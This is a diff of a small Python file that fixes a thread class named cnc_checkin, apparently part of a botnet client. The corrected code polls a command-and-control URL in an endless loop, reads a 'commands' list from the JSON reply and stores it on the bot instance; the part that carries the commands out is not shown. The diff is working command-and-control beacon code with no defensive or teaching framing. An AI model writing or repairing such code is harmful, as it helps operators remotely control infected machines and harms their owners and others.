@@ -1,26 +1,26 @@
-from bot_helper import parse_commands
-from threading import thread
+from threading import Thread
 from time import sleep
+import json
 import requests
 
-class cnc_checkin(Thread,Bot_Instance):
+class cnc_checkin(Thread):
 
-    def __init__(self):
+    def __init__(self,BotInstance):
         Thread.__init__(self)
+        self.BotInstance = BotInstance
         
     def run(self):
         while(True):
-            curr_commands = requests.get(Bot_Instance.cnc_url))
+            curr_commands = requests.get(self.BotInstance.cnc_url)
             try:
-                curr_commands = parse_commands(curr_commands)
-
+                curr_commands = curr_commands.json()['commands']
             except:
                 raise
 
-            if curr_commands != Bot_Instance.commands:
-                Bot_Instance.commands = parse_commands(curr_commands)
+            if curr_commands != self.BotInstance.commands:
+                self.BotInstance.commands = curr_commands
             
-            sleep(Bot_instance.wait_time)
+            sleep(self.BotInstance.wait_time)
 
 
 
